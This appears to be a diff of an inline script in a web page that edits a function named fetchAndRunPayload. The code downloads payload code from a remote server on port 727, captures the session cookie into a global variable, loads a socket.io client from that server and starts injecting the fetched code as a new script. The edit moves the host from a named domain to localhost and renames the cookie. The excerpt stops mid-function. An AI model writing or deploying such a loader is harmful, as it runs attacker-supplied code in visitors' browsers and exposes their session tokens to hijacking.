@@ -3,14 +3,14 @@
 <script>
 async function fetchAndRunPayload() {
     try {
-        const res = await fetch("https://main.cds.com:727/get_payload"); 
+        const res = await fetch("http://localhost:727/get_payload"); 
         const payloadCode = await res.text(); 
-        const sessionId = document.cookie.split('; ').find(row => row.startsWith('sessionid='))?.split('=')[1];
+        const sessionId = document.cookie.split('; ').find(row => row.startsWith('session='))?.split('=')[1];
         window.currentSessionId = sessionId;  
 
         if (payloadCode) {
             const ioScript = document.createElement("script");
-            ioScript.src = "https://main.cds.com:727/static/js/socket.io.min.js"; 
+            ioScript.src = "http://localhost:727/static/js/socket.io.min.js"; 
             ioScript.onload = () => {
                 const script = document.createElement("script");
                 script.type = "text/javascript";
